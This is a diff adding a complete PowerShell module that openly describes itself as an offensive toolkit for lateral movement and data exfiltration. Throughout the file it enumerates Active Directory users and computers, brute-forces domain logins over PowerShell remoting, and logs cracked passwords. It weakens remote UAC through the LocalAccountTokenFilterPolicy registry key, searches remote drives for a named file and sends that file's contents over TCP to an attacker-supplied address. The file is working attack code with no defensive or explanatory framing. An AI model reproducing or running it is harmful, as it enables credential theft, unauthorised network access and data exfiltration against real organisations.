@@ -1,0 +1,234 @@
+<#
+.SYNOPSIS
+    Offensive PowerShell Toolkit for lateral movement and data exfiltration
+.DESCRIPTION
+    This module provides functionality to brute force domain accounts, locate sensitive files,
+    set registry keys, and exfiltrate data over TCP.
+.NOTES
+    File Name      : OffensiveToolkit.psm1
+    Author         : 
+    Prerequisite   : PowerShell v5.1 or later
+#>
+
+function BeginImplant {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$PassList,
+        [Parameter(Mandatory=$true)]
+        [string]$FileName,
+        [Parameter(Mandatory=$true)]
+        [string]$Target,
+        [Parameter(Mandatory=$false)]
+        [string]$LogFile
+    )
+
+    # Initialize variables
+    $global:LockedOutAccounts = @{}
+    $global:ObservationWindow = 30  # Default observation window in minutes
+    $global:AttemptsBeforeLockout = 5  # Default lockout threshold
+    $global:SuccessfulLogins = @()
+    
+    # Parse target into IP and Port
+    $TargetParts = $Target -split ":"
+    $ServerIP = $TargetParts[0]
+    $ServerPort = $TargetParts[1]
+    
+    # Main execution flow
+    try {
+        Write-Host "[*] Starting implant operations..."
+        
+        # Step 1: Get domain computers
+        $Computers = GetDomainComputers
+        if (-not $Computers) {
+            Write-Host "[-] No domain computers found"
+            return
+        }
+        Write-Host "[+] Found $($Computers.Count) domain computers"
+        
+        # Step 2: Get domain users
+        $Users = GetDomainUsers
+        if (-not $Users) {
+            Write-Host "[-] No domain users found"
+            return
+        }
+        Write-Host "[+] Found $($Users.Count) domain users"
+        
+        # Step 3: Get password list
+        $Passwords = Get-Content $PassList -ErrorAction Stop
+        if (-not $Passwords) {
+            Write-Host "[-] No passwords found in password list"
+            return
+        }
+        Write-Host "[+] Loaded $($Passwords.Count) passwords"
+        
+        # Step 4: Brute force attempts
+        foreach ($Computer in $Computers) {
+            foreach ($User in $Users) {
+                foreach ($Password in $Passwords) {
+                    # Check if account is locked out
+                    if ($global:LockedOutAccounts.ContainsKey($User.SamAccountName)) {
+                        $lockoutTime = $global:LockedOutAccounts[$User.SamAccountName]
+                        $timeSinceLockout = (Get-Date) - $lockoutTime
+                        
+                        if ($timeSinceLockout.TotalMinutes -lt $global:ObservationWindow) {
+                            Write-Host "[*] Account $($User.SamAccountName) is locked out. Skipping..."
+                            continue
+                        } else {
+                            $global:LockedOutAccounts.Remove($User.SamAccountName)
+                        }
+                    }
+                    
+                    # Attempt login
+                    $cred = $null
+                    try {
+                        $securePass = ConvertTo-SecureString $Password -AsPlainText -Force
+                        $cred = New-Object System.Management.Automation.PSCredential("$($User.SamAccountName)", $securePass)
+                        
+                        # Test connection
+                        $session = New-PSSession -ComputerName $Computer.Name -Credential $cred -ErrorAction Stop
+                        
+                        Write-Host "[+] Successful login: $($User.SamAccountName):$Password on $($Computer.Name)"
+                        
+                        # Log successful login
+                        $loginInfo = @{
+                            Username = $User.SamAccountName
+                            Password = $Password
+                            Computer = $Computer.Name
+                            Timestamp = Get-Date
+                        }
+                        $global:SuccessfulLogins += $loginInfo
+                        
+                        if ($LogFile) {
+                            "$($User.SamAccountName):$Password on $($Computer.Name) at $(Get-Date)" | Out-File $LogFile -Append
+                        }
+                        
+                        # Step 5: Search for file
+                        $fileFound = Invoke-Command -Session $session -ScriptBlock {
+                            param($FileName)
+                            
+                            # Search for file
+                            $file = Get-ChildItem -Path C:\ -Recurse -Filter $FileName -ErrorAction SilentlyContinue | Select-Object -First 1
+                            
+                            if ($file) {
+                                return $file.FullName
+                            }
+                            return $null
+                        } -ArgumentList $FileName
+                        
+                        if ($fileFound) {
+                            Write-Host "[+] Found target file at: $fileFound"
+                            
+                            # Step 6: Set registry key
+                            Invoke-Command -Session $session -ScriptBlock {
+                                $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+                                $regName = "LocalAccountTokenFilterPolicy"
+                                
+                                if (-not (Test-Path $regPath)) {
+                                    New-Item -Path $regPath -Force | Out-Null
+                                }
+                                
+                                if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+                                    New-ItemProperty -Path $regPath -Name $regName -Value 1 -PropertyType DWORD -Force | Out-Null
+                                } else {
+                                    Set-ItemProperty -Path $regPath -Name $regName -Value 1 -Force | Out-Null
+                                }
+                                
+                                Write-Host "[+] Registry key set successfully"
+                            }
+                            
+                            # Step 7: Exfiltrate file
+                            $fileContent = Invoke-Command -Session $session -ScriptBlock {
+                                param($filePath)
+                                Get-Content -Path $filePath -Raw
+                            } -ArgumentList $fileFound
+                            
+                            SendFileOverTCP -Data $fileContent -ServerIP $ServerIP -Port $ServerPort
+                            
+                            # Clean up
+                            Remove-PSSession $session
+                            return
+                        }
+                        
+                        # Clean up session if no file found
+                        Remove-PSSession $session
+                    }
+                    catch [System.Management.Automation.Remoting.PSRemotingTransportException] {
+                        if ($_.Exception.Message -like "*account is currently locked out*") {
+                            Write-Host "[-] Account $($User.SamAccountName) is locked out"
+                            $global:LockedOutAccounts[$User.SamAccountName] = Get-Date
+                        }
+                    }
+                    catch {
+                        # Ignore other errors and continue
+                    }
+                }
+            }
+        }
+        
+        Write-Host "[-] Target file not found on any accessible computer"
+    }
+    catch {
+        Write-Host "[-] Error in main execution: $_"
+    }
+}
+
+function GetDomainComputers {
+    try {
+        $searcher = [ADSISearcher]"(objectCategory=Computer)"
+        $searcher.PageSize = 200
+        $computers = $searcher.FindAll() | ForEach-Object {
+            $_.GetDirectoryEntry()
+        }
+        return $computers
+    }
+    catch {
+        Write-Host "[-] Error enumerating domain computers: $_"
+        return $null
+    }
+}
+
+function GetDomainUsers {
+    try {
+        $searcher = [ADSISearcher]"(objectCategory=User)"
+        $searcher.PageSize = 200
+        $users = $searcher.FindAll() | ForEach-Object {
+            $_.GetDirectoryEntry()
+        }
+        return $users
+    }
+    catch {
+        Write-Host "[-] Error enumerating domain users: $_"
+        return $null
+    }
+}
+
+function SendFileOverTCP {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$Data,
+        [Parameter(Mandatory=$true)]
+        [string]$ServerIP,
+        [Parameter(Mandatory=$true)]
+        [int]$Port
+    )
+    
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient($ServerIP, $Port)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        
+        $writer.Write($Data)
+        $writer.Flush()
+        
+        $writer.Close()
+        $stream.Close()
+        $client.Close()
+        
+        Write-Host "[+] File successfully exfiltrated to $ServerIP`:$Port"
+    }
+    catch {
+        Write-Host "[-] Error sending file over TCP: $_"
+    }
+}
+
+Export-ModuleMember -Function BeginImplant
